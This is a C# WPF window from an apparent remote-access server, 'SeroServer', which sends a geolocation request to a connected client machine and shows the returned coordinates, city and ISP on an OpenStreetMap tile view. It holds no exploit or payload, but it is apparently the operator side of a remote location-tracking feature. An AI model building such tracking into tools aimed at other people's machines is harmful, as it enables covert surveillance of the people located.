using System;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Windows;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class GeoWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private double _lat, _lon;
    private bool   _hasData;
    private int    _zoom = 14;

    public GeoWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.GeoResult, OnResult);
        _server.ClientDisconnected += OnDisconnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.GeoResult);
            _server.ClientDisconnected -= OnDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    private void ApplyLanguage()
    {
        if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(ApplyLanguage); return; }
        Title                               = Lang.Get("FEAT_GEOLOCATION");
        if (TxtBtnLocate    != null) TxtBtnLocate.Text    = Lang.Get("GEO_LOCATE");
        if (TxtBtnMap       != null) TxtBtnMap.Text       = Lang.Get("GEO_OPEN_MAP");
        if (TxtIdle         != null) TxtIdle.Text         = Lang.Get("GEO_IDLE");
        if (TxtLblCoords    != null) TxtLblCoords.Text    = Lang.Get("GEO_COORDS");
        if (TxtLblSource    != null) TxtLblSource.Text    = Lang.Get("GEO_SOURCE");
        if (TxtBtnCopy      != null) TxtBtnCopy.Text      = Lang.Get("GEO_COPY");
        if (TxtBtnCopyAddr  != null) TxtBtnCopyAddr.Text  = Lang.Get("GEO_COPY");
    }

    private async void Locate_Click(object sender, RoutedEventArgs e)
    {
        BtnLocate.IsEnabled  = false;
        BtnOpenMap.IsEnabled = false;
        TxtStatus.Text       = Lang.Get("GEO_LOCATING");

        PnlMapIdle.Visibility  = Visibility.Visible;
        PnlMapError.Visibility = Visibility.Collapsed;
        MapBrowser.Visibility  = Visibility.Collapsed;
        PnlZoom.Visibility     = Visibility.Collapsed;
        PnlData.Visibility     = Visibility.Collapsed;
        TxtIdle.Text           = Lang.Get("GEO_LOCATING");

        try
        {
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.GeoRequest });
        }
        catch
        {
            BtnLocate.IsEnabled = true;
            ShowError(Lang.Get("PM_DISCONNECTED"));
        }
    }

    private void OnResult(Packet pkt)
    {
        Dispatcher.BeginInvoke(() =>
        {
            BtnLocate.IsEnabled = true;

            GeoResultData? data;
            try { data = JsonConvert.DeserializeObject<GeoResultData>(pkt.Data); }
            catch { ShowError(Lang.Get("GEO_PARSE_ERR")); return; }

            if (data == null) { ShowError(Lang.Get("GEO_PARSE_ERR")); return; }
            if (!string.IsNullOrEmpty(data.Error)) { ShowError(data.Error); return; }

            _lat = data.Lat;
            _lon = data.Lon;
            _hasData = true;

            // Build readable address from city + region + country
            var parts = new[] { data.City, data.Region, data.Country }
                .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
            var addr = parts.Length > 0 ? string.Join(", ", parts) : $"{data.Lat.ToString("F4", CultureInfo.InvariantCulture)}°, {data.Lon.ToString("F4", CultureInfo.InvariantCulture)}°";

            TxtAddress.Text = addr;
            TxtIspLine.Text = $"{data.Source}  •  ±{data.Accuracy:F0} m";
            TxtCoords.Text  = $"{data.Lat.ToString("F6", CultureInfo.InvariantCulture)}°,  {data.Lon.ToString("F6", CultureInfo.InvariantCulture)}°";
            TxtSource.Text  = data.Source;
            TxtRaw.Text     = pkt.Data;
            TxtStatus.Text  = addr;

            BtnCopyCoords.IsEnabled = true;
            BtnOpenMap.IsEnabled    = true;
            PnlData.Visibility      = Visibility.Visible;

            // Load embedded map — OSM tiles via NavigateToString (no JS, no script error)
            PnlMapIdle.Visibility  = Visibility.Collapsed;
            PnlMapError.Visibility = Visibility.Collapsed;
            ShowTileMap(data.Lat, data.Lon, _zoom);
        });
    }

    protected override void OnSourceInitialized(EventArgs e)
    {
        base.OnSourceInitialized(e);
        if (PresentationSource.FromVisual(this) is System.Windows.Interop.HwndSource src)
            src.AddHook(MapWheelHook);
    }

    private nint MapWheelHook(nint hwnd, int msg, nint wParam, nint lParam, ref bool handled)
    {
        const int WM_MOUSEWHEEL = 0x020A;
        if (msg == WM_MOUSEWHEEL && _hasData && MapBrowser.Visibility == Visibility.Visible)
        {
            // Only zoom when cursor is over the map area
            var screen = new System.Windows.Point(
                unchecked((short)(lParam.ToInt32() & 0xFFFF)),
                unchecked((short)((lParam.ToInt32() >> 16) & 0xFFFF)));
            var local = PointFromScreen(screen);
            var mapBottom = MapGrid.TranslatePoint(new System.Windows.Point(0, MapGrid.ActualHeight), this).Y;
            if (local.Y >= 0 && local.Y <= mapBottom)
            {
                int delta = unchecked((short)((wParam.ToInt32() >> 16) & 0xFFFF));
                if (delta > 0) ZoomIn(); else ZoomOut();
            }
        }
        return IntPtr.Zero;
    }

    private void ZoomIn()
    {
        if (_zoom >= 18 || !_hasData) return;
        _zoom++;
        ShowTileMap(_lat, _lon, _zoom);
    }

    private void ZoomOut()
    {
        if (_zoom <= 3 || !_hasData) return;
        _zoom--;
        ShowTileMap(_lat, _lon, _zoom);
    }

    private void ZoomIn_Click(object s, RoutedEventArgs e) => ZoomIn();
    private void ZoomOut_Click(object s, RoutedEventArgs e) => ZoomOut();

    private void ShowTileMap(double lat, double lon, int zoom)
    {
        const int w = 480, h = 220;

        double n = 1 << zoom;
        double tx = (lon + 180.0) / 360.0 * n;
        double latRad = lat * Math.PI / 180.0;
        double ty = (1.0 - Math.Log(Math.Tan(latRad) + 1.0 / Math.Cos(latRad)) / Math.PI) / 2.0 * n;

        int txi = (int)Math.Floor(tx);
        int tyi = (int)Math.Floor(ty);
        int pinInTileX = (int)((tx - txi) * 256);
        int pinInTileY = (int)((ty - tyi) * 256);

        // Position grid so pin appears at map center
        int gridLeft = w / 2 - (256 + pinInTileX);
        int gridTop  = h / 2 - (256 + pinInTileY);

        var sb = new StringBuilder();
        sb.Append("<!DOCTYPE html><html><head>");
        sb.Append("<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/>");
        sb.Append("<style>*{margin:0;padding:0;border:0;}");
        sb.Append("body{overflow:hidden;background:#aad3df;}");
        sb.Append($".m{{position:relative;width:{w}px;height:{h}px;overflow:hidden;}}");
        sb.Append(".t{position:absolute;width:256px;height:256px;}");
        sb.Append(".pin{position:absolute;width:12px;height:12px;background:#e83030;");
        sb.Append("border:2px solid #fff;border-radius:50%;margin-left:-6px;margin-top:-6px;");
        sb.Append("box-shadow:0 1px 4px rgba(0,0,0,.55);}");
        sb.Append("</style></head><body><div class=\"m\">");

        int nTiles = (int)n;
        for (int dy = -1; dy <= 1; dy++)
        for (int dx = -1; dx <= 1; dx++)
        {
            int ty2 = tyi + dy;
            if (ty2 < 0 || ty2 >= nTiles) continue;
            int tx2 = ((txi + dx) % nTiles + nTiles) % nTiles;
            int imgL = gridLeft + (dx + 1) * 256;
            int imgT = gridTop  + (dy + 1) * 256;
            sb.Append($"<img class=\"t\" style=\"left:{imgL}px;top:{imgT}px\"");
            sb.Append($" src=\"https://tile.openstreetmap.org/{zoom}/{tx2}/{ty2}.png\">");
        }

        sb.Append($"<div class=\"pin\" style=\"left:{w / 2}px;top:{h / 2}px;\"></div>");
        sb.Append("</div></body></html>");

        MapBrowser.NavigateToString(sb.ToString());
        MapBrowser.Visibility = Visibility.Visible;
        PnlZoom.Visibility    = Visibility.Visible;
    }

    private void ShowError(string msg)
    {
        TxtMapError.Text       = msg;
        TxtStatus.Text         = msg;
        PnlMapIdle.Visibility  = Visibility.Collapsed;
        MapBrowser.Visibility  = Visibility.Collapsed;
        PnlZoom.Visibility     = Visibility.Collapsed;
        PnlMapError.Visibility = Visibility.Visible;
        PnlData.Visibility     = Visibility.Collapsed;
        BtnLocate.IsEnabled    = true;
        BtnOpenMap.IsEnabled   = false;
    }

    private void OpenMap_Click(object sender, RoutedEventArgs e)
    {
        if (!_hasData) return;
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName        = $"https://www.google.com/maps?q={_lat.ToString("F6", CultureInfo.InvariantCulture)},{_lon.ToString("F6", CultureInfo.InvariantCulture)}",
                UseShellExecute = true,
            });
        }
        catch { }
    }

    private void CopyCoords_Click(object sender, RoutedEventArgs e)
    {
        if (_hasData) Clipboard.SetText($"{_lat.ToString("F6", CultureInfo.InvariantCulture)}, {_lon.ToString("F6", CultureInfo.InvariantCulture)}");
    }

    private void CopyAddr_Click(object sender, RoutedEventArgs e)
    {
        if (TxtAddress?.Text is { Length: > 0 } txt)
            Clipboard.SetText(txt);
    }

    private void OnDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            BtnLocate.IsEnabled = true;
            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
        });
    }
}
